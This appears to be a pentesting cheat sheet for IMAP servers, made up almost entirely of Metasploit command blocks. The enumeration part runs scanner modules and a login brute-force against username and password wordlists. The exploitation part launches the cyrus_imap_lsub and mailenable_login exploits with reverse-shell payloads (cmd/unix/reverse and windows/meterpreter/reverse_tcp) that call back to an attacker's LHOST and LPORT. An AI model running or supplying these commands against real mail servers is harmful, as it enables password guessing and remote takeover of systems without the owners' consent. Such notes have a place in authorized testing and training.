# Imap

## Enumeration

### Metasploit

##### imap_enum
```bash
use auxiliary/scanner/imap/imap_enum
set RHOSTS [IP]
set RPORT 143
run
```

##### imap_login
```bash
use auxiliary/scanner/imap/imap_login
set RHOSTS [IP]
set RPORT 143
set USER_FILE [username wordlist]
set PASS_FILE [password wordlist]
run
```

##### imap_capabilities
```bash
use auxiliary/scanner/imap/imap_capabilities
set RHOSTS [IP]
set RPORT 143
run
```


---
---


## Exploitation

### Metasploit

##### cyrus_imap_lsub
```bash
use exploit/unix/imap/cyrus_imap_lsub
set RHOSTS [IP]
set RPORT 143
set PAYLOAD cmd/unix/reverse
set LHOST [IP]
set LPORT [port]
run
```

##### mailenable_login
```bash
use exploit/windows/imap/mailenable_login
set RHOSTS [IP]
set RPORT 143
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [IP]
set LPORT [port]
run
```